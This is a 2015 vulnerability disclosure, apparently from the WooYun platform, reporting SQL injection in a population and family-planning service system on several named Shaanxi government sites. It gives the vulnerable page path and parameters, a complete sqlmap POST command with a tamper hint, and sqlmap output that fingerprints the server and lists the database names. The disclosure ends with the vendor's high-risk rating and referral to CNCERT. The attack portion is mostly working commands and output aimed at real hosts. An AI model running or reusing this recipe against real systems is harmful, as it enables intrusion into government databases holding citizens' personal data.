wybug_title: 某人口和计划生育服务系统通用型sql注射打包
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-04-16：	细节已通知厂商并且等待厂商处理中									2015-04-21：	厂商已经确认，细节仅向厂商公开									2015-04-24：	细节向第三方安全合作伙伴开放									2015-06-15：	细节向核心白帽子及相关领域专家公开									2015-06-25：	细节向普通白帽子公开									2015-07-05：	细节向实习白帽子公开									2015-07-20：	细节向公众公开  简要描述： 1 详细说明：  西安网是科技发展有限公司厂商名字主要影响的是陕西的一些注入的位置Services/Singleton/cbd1727fbe80c268/0306/610122103203.shtml     参数 ：1-4  txtName,txtMateName,txtMateIDCard案例 http://service.ltpop.gov.cn/http://service.zzxpop.gov.cn/http://service.zyxpop.gov.cn/http://service.akpop.gov.cn/http://service.hsrk.gov.cn/http://service.ltjsj.gov.cn/来两个丢进sqlmaphttp://service.ltpop.gov.cn/Services/Singleton/cbd1727fbe80c268/0306/610122103203.shtml   --data  "__VIEWSTATE=%2FwEPDwUKLTE0Mjg5NTI1MQ9kFgICAxBkZBYCAhEPDxYCHgdWaXNpYmxlZ2QWAgIBDw9kFgIeB29uY2xpY2sFHnJldHVybiBWYWxpZGF0ZU1hcnJ5cygnMDMwNicpO2RkaXmHoAlAKLE%2BcpnhMWe7lrOmQFo%3D&txtU=Singleton&txtV=cbd1727fbe80c268&txtW=0306&txtX=610122103203&SearchKeys=+%E5%85%B3%E9%94%AE%E5%AD%97&txtName=SSS&txtIDCard=370205621219253&txtOriginalArea=2&txtMateName=2&txtMateIDCard=370205621219253&txtMateOriginalArea=2&txtMarriageStatus=%E5%86%8D%E5%A9%9A&txtCurrentAddress=2&txtCommTxtA=&pType=0&cbx01=1&cbx01=1&cbx01=1&cbx01=1&cbx01=1&txtCommMemo=222&txtContactTel=13232123212&txtContaceMail=&ButApply=&GoBack="   -p "txtName,txtMateName,txtMateIDCard" txtIDCard    可能需要加上--tamper=between 才能跑出来其他案例没有这个现象


there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: txtMateIDCard, type: Single quoted string (default)[1] place: POST, parameter: txtName, type: Single quoted string[2] place: POST, parameter: txtMateName, type: Single quoted string[3] place: POST, parameter: txtIDCard, type: Single quoted string[q] Quit>[13:36:09] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[13:36:09] [INFO] fetching database names[13:36:11] [WARNING] something went wrong with full UNION technique (most probably because of limitation on retrieved number of entries). Falling back to partial UNION technique[13:36:14] [WARNING] the SQL query provided does not return any output[13:36:16] [WARNING] the SQL query provided does not return any output[13:36:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[13:36:16] [INFO] fetching number of databases[13:36:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[13:36:16] [INFO] retrieved:[13:36:20] [WARNING] time-based comparison requires larger statistical model, please wait........................[13:36:34] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[13:36:36] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[13:36:39] [ERROR] unable to retrieve the number of databases[13:36:40] [INFO] heuristics detected web page charset 'ISO-8859-2'available databases [8]:[*] LT_CIEP[*] LT_PMSS[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-04-21 11:57 厂商回复： CNVD未直接复现所述情况，已经转由CNCERT下发给陕西分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
